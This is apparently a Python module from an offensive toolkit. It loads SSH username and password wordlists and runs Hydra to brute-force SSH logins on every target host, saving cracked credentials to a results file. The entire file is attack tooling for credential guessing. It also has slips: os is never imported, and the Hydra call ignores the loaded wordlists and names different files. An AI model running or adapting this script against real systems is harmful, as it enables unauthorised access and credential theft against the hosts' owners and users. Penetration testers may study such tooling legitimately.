from globals import global_live_hosts  # Import global variables
import subprocess


def load_wordlists():
    """
    Load usernames and passwords from the wordlists directory.

    :return: Tuple (usernames, passwords)
    """
    wordlist_dir = "wordlists"
    username_file = f"{wordlist_dir}/ssh_usernames.txt"
    password_file = f"{wordlist_dir}/ssh_passwords.txt"

    usernames, passwords = [], []

    try:
        if not os.path.exists(username_file):
            raise FileNotFoundError(f"[ERROR] Username wordlist not found: {username_file}")

        if not os.path.exists(password_file):
            raise FileNotFoundError(f"[ERROR] Password wordlist not found: {password_file}")

        with open(username_file, "r") as uf:
            usernames = [line.strip() for line in uf if line.strip()]

        with open(password_file, "r") as pf:
            passwords = [line.strip() for line in pf if line.strip()]

    except Exception as e:
        print(f"[ERROR] Failed to load wordlists: {e}")

    print(f"[INFO] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
    return usernames, passwords


def bruteforce_ssh(targets, usernames, passwords, max_threads=1):
    """
    Perform SSH brute force attack using Hydra.

    :param targets: List of target hosts to attack
    :param usernames: List of usernames to test
    :param passwords: List of passwords to test
    :param max_threads: Maximum number of concurrent threads
    """
    results_file = "results/cracked.txt"
    print("[INFO] Starting brute force attack...")

    for target in targets:
        print(f"[INFO] Targeting {target}...")

        try:
            # Call Hydra for brute forcing
            subprocess.run(
                [
                    "hydra",
                    "-L",
                    "wordlists/usernames.txt",
                    "-P",
                    "wordlists/passwords.txt",
                    target,
                    "ssh",
                    "-o",
                    results_file,
                    "-t",
                    str(max_threads),
                    "-vV",
                ],
                check=True,
            )
            print(f"[INFO] Results saved to {results_file}")

        except FileNotFoundError:
            print("[ERROR] Hydra is not installed or not found in PATH. Please install Hydra.")
        except subprocess.CalledProcessError:
            print(f"[ERROR] Hydra failed to brute force {target}.")
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
